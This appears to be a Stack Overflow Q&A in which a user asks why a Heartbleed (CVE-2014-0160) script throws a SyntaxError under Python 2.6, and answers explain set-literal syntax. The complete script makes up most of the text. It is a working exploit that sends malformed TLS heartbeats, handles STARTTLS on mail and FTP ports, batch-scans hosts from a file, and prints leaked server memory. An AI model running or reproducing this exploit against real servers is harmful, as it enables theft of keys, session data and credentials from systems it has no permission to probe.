@@ -1,0 +1,318 @@
+<div class="post-text" itemprop="text">
+<p>When I try to run the following heartbleed code, it throws a syntax error. I am new to python. I have tried to find the syntax error, but failed. I am using python 2.6.</p>
+<pre><code>#!/usr/bin/python
+
+import sys
+import struct
+import socket
+import time
+import select
+import re
+from optparse import OptionParser
+
+options = OptionParser(usage='%prog server [options]', description='Test for SSL heartbeat vulnerability (CVE-2014-0160)')
+options.add_option('-p', '--port', type='int', default=443, help='TCP port to test (default: 443)')
+options.add_option('-n', '--num', type='int', default=1, help='Number of times to connect/loop (default: 1)')
+options.add_option('-t', '--tls', type='int', default=1, help='Specify TLS version: 0 = 1.0, 1 = 1.1, 2 = 1.2 (default: 1)')
+options.add_option('-s', '--starttls', action="store_true", dest="starttls", help='Issue STARTTLS command for SMTP/POP/IMAP/FTP/etc...')
+options.add_option('-f', '--filein', type='str', help='Specify input file, line delimited, IPs or hostnames or IP:port or hostname:port')
+options.add_option('-v', '--verbose', action="store_true", dest="verbose", help='Enable verbose output')
+
+opts, args = options.parse_args()
+
+def h2bin(x):
+    return x.replace(' ', '').replace('\n', '').decode('hex')
+
+hello = h2bin('''
+16 03 02 00  dc 01 00 00 d8 03 02 53
+43 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf
+bd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 00
+00 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 88
+00 87 c0 0f c0 05 00 35  00 84 c0 12 c0 08 c0 1c
+c0 1b 00 16 00 13 c0 0d  c0 03 00 0a c0 13 c0 09
+c0 1f c0 1e 00 33 00 32  00 9a 00 99 00 45 00 44
+c0 0e c0 04 00 2f 00 96  00 41 c0 11 c0 07 c0 0c
+c0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11
+00 08 00 06 00 03 00 ff  01 00 00 49 00 0b 00 04
+03 00 01 02 00 0a 00 34  00 32 00 0e 00 0d 00 19
+00 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 08
+00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13
+00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00
+00 0f 00 01 01                                  
+''')
+
+# set TLS version
+if opts.tls == 0:
+    hb = h2bin('''18 03 01 00 03 01 40 00''')
+elif opts.tls == 1:
+    hb = h2bin('''18 03 02 00 03 01 40 00''')
+elif opts.tls == 2:
+    hb = h2bin('''18 03 03 00 03 01 40 00''')
+else:
+    hb = h2bin('''18 03 02 00 03 01 40 00''')
+
+
+def hexdump(s):
+    pdat = ''
+    for b in xrange(0, len(s), 16):
+        lin = [c for c in s[b : b + 16]]
+        #hxdat = ' '.join('%02X' % ord(c) for c in lin)
+        pdat += ''.join((c if ((32 &lt;= ord(c) &lt;= 126) or (ord(c) == 10) or (ord(c) == 13)) else '.' )for c in lin)
+    #print '  %04x: %-48s %s' % (b, hxdat, pdat)
+    pdat = re.sub(r'([.]{50,})', '', pdat)
+    return pdat
+
+def recvall(s, length, timeout=5):
+    try:
+        endtime = time.time() + timeout
+        rdata = ''
+        remain = length
+        while remain &gt; 0:
+            rtime = endtime - time.time() 
+            if rtime &lt; 0:
+                return None
+            r, w, e = select.select([s], [], [], 5)
+            if s in r:
+                data = s.recv(remain)
+                # EOF?
+                if not data:
+                    return None
+                rdata += data
+                remain -= len(data)
+        return rdata
+
+    except:
+       print "Error receiving data: ", sys.exc_info()[0]
+
+def recvmsg(s):
+    hdr = recvall(s, 5)
+    if hdr is None:
+        print 'Unexpected EOF receiving record header - server closed connection'
+        return None, None, None
+    typ, ver, ln = struct.unpack('&gt;BHH', hdr)
+    pay = recvall(s, ln, 10)
+    if pay is None:
+        print 'Unexpected EOF receiving record payload - server closed connection'
+        return None, None, None
+    if opts.verbose:
+        print ' ... received message: type = %d, ver = %04x, length = %d' % (typ, ver, len(pay))
+    return typ, ver, pay
+
+def hit_hb(s, targ):
+    s.send(hb)
+    while True:
+        typ, ver, pay = recvmsg(s)
+        if typ is None:
+            print 'No heartbeat response received, server likely not vulnerable'
+            return ''
+
+        if typ == 24:
+            if opts.verbose:
+                print 'Received heartbeat response...'
+            #hexdump(pay)
+            if len(pay) &gt; 3:
+                print 'WARNING: ' + targ + ':' + str(opts.port) + ' returned more data than it should - server is vulnerable!'
+            else:
+                print 'Server processed malformed heartbeat, but did not return any extra data.'
+            return hexdump(pay)
+
+        if typ == 21:
+            print 'Received alert:'
+            hexdump(pay)
+            print 'Server returned error, likely not vulnerable'
+            return ''
+
+def bleed(targ, port):
+    try:
+        res = ''
+        print
+        print '##################################################################'
+        print 'Connecting to: ' + targ + ':' + str(port) + ' with TLSv1.' + str(opts.tls)
+        for x in range(0, opts.num):
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sys.stdout.flush()
+            s.settimeout(10)
+            s.connect((targ, port))
+
+            # send starttls command if specified as an option or if common smtp/pop3/imap ports are used
+            if (opts.starttls) or (port in {25, 587, 110, 143, 21}):
+
+                stls = False
+                atls = False
+
+                # check if smtp supports starttls/stls
+                if port in {25, 587}:
+                    print 'SMTP Port... Checking for STARTTLS Capability...'
+                    check = s.recv(1024)
+                    s.send("EHLO someone.org\n")
+                    sys.stdout.flush()
+                    check += s.recv(1024)
+                    if opts.verbose:
+                        print check
+
+                    if "STARTTLS" in check:
+                        opts.starttls = True
+                        print "STARTTLS command found"
+                    elif "STLS" in check:
+                        opts.starttls = True
+                        stls = True
+                        print "STLS command found"
+                    else:
+                        print "STARTTLS command NOT found!"
+                        print '##################################################################'
+                        return
+
+                # check if pop3/imap supports starttls/stls                            
+                elif port in {110, 143}:
+                    print 'POP3/IMAP4 Port... Checking for STARTTLS Capability...'
+                    check = s.recv(1024)
+                    if port == 110:
+                        s.send("CAPA\n")
+                    if port == 143:
+                        s.send("CAPABILITY\n")
+                    sys.stdout.flush()
+                    check += s.recv(1024)
+                    if opts.verbose:
+                        print check
+
+                    if "STARTTLS" in check:
+                        opts.starttls = True
+                        print "STARTTLS command found"
+                    elif "STLS" in check:
+                        opts.starttls = True
+                        stls = True
+                        print "STLS command found"
+                    else:
+                        print "STARTTLS command NOT found!"
+                        print '##################################################################'
+                        return
+
+                # check if ftp supports auth tls/starttls                          
+                elif port in {21}:
+                    print 'FTP Port... Checking for AUTH TLS Capability...'
+                    check = s.recv(1024)
+                    s.send("FEAT\n")
+                    sys.stdout.flush()
+                    check += s.recv(1024)
+                    if opts.verbose:
+                        print check
+
+                    if "STARTTLS" in check:
+                        opts.starttls = True
+                        print "STARTTLS command found"
+                    elif "AUTH TLS" in check:
+                        opts.starttls = True
+                        atls = True
+                        print "AUTH TLS command found"
+                    else:
+                        print "STARTTLS command NOT found!"
+                        print '##################################################################'
+                        return
+
+                # send appropriate tls command if supported                        
+                if opts.starttls:       
+                    sys.stdout.flush()
+                    if stls:
+                        print 'Sending STLS Command...'
+                        s.send("STLS\n")
+                    elif atls:
+                        print 'Sending AUTH TLS Command...'
+                        s.send("AUTH TLS\n")
+                    else:
+                        print 'Sending STARTTLS Command...'
+                        s.send("STARTTLS\n")
+                    if opts.verbose:
+                        print 'Waiting for reply...'
+                    sys.stdout.flush()
+                    recvall(s, 100000, 1)
+
+            print
+            print 'Sending Client Hello...'
+            sys.stdout.flush()
+            s.send(hello)
+            if opts.verbose:
+                print 'Waiting for Server Hello...'
+            sys.stdout.flush()
+            while True:
+                typ, ver, pay = recvmsg(s)
+                if typ == None:
+                    print 'Server closed connection without sending Server Hello.'
+                    print '##################################################################'
+                    return
+                # Look for server hello done message.
+                if typ == 22 and ord(pay[0]) == 0x0E:
+                    break
+
+            print 'Sending heartbeat request...'
+            sys.stdout.flush()
+            s.send(hb)
+            res += hit_hb(s, targ)
+            s.close()
+
+        print '##################################################################'
+        print       
+        return res
+
+    except:
+       print "Error connecting to host: ", sys.exc_info()[0]
+       print '##################################################################'
+       print               
+
+def main():
+    allresults = ''
+
+    # if a file is specified, loop through file
+    if opts.filein:
+        fileIN = open(opts.filein, "r")
+
+        for line in fileIN:
+            targetinfo = line.strip().split(":")
+            if len(targetinfo) &gt; 1:
+                allresults = bleed(targetinfo[0], int(targetinfo[1]))
+            else:
+                allresults = bleed(targetinfo[0], opts.port)
+
+            if allresults:
+                print '%s' % (allresults)
+
+        fileIN.close()
+
+    else:
+        if len(args) &lt; 1:
+            options.print_help()
+            return
+        allresults = bleed(args[0], opts.port)
+        if allresults:
+            print '%s' % (allresults)
+
+    print
+
+if __name__ == '__main__':
+    main()
+</code></pre>
+<p>The error is:</p>
+<p><em>root@bt:~/Desktop# python heartbleed.py File "heartbleed.py", line 238
+    if (opts.starttls) or (port in {25, 587, 110, 143, 21}):
+                                      ^
+SyntaxError: invalid syntax</em></p>
+</div>
+<div class="post-text" itemprop="text">
+<p>Please try </p>
+<pre><code>if (opts.starttls) or (port in (25, 587, 110, 143, 21)):
+</code></pre>
+<p>Convert it to tuple.</p>
+</div>
+<div class="post-text" itemprop="text">
+<pre><code>{25, 587, 110, 143, 21}
+</code></pre>
+<p>is Python 3 syntax. It creates a set, and the direct Python 2.x equivalent code would be</p>
+<pre><code>set((25, 587, 110, 143, 21))
+</code></pre>
+<p>though any sequence type would do (e.g. Lafada's answer), but you might well find the rest of the code has bits that aren't backwards compatible with in Python 2.x</p>
+<p>Edit: I'm wrong. As per @jpmc26's comment, it's Python 3 syntax but also backported to Python 2.7+</p>
+</div>
+<span class="comment-copy">@TesselatingHeckler Okay, so does that mean it's better to upgrade to python 3? Lafada's bit fixed all those syntax errors, but there are new ones now!  _Error receiving data:  &lt;class 'socket.error'&gt; Unexpected EOF receiving record payload - server closed connection _</span>
+<span class="comment-copy">Yes - unless you have other scripts that need Python 2, then try and keep both interpreters, because those scripts might not run on Python 3. Edit: I don't know if that error is version related, or something else.</span>
+<span class="comment-copy">Makes sense. Thank you!</span>
+<span class="comment-copy">You're somewhat incorrect. The <code>{1,2,3}</code> literal syntax is was backported in 2.7. See <a href="https://docs.python.org/3/whatsnew/2.7.html#python-3-1-features" rel="nofollow noreferrer">docs.python.org/3/whatsnew/2.7.html#python-3-1-features</a>. (And yes, I did test to be sure.)</span>
+<span class="comment-copy">@jpmc26 : that's weird. I definitely tested it and got an error, and then checked it in Python 3 and found it was type('set'). Now I retest and of course it works ... what on earth did I test before??? Thanks, I've edited my answer.</span>
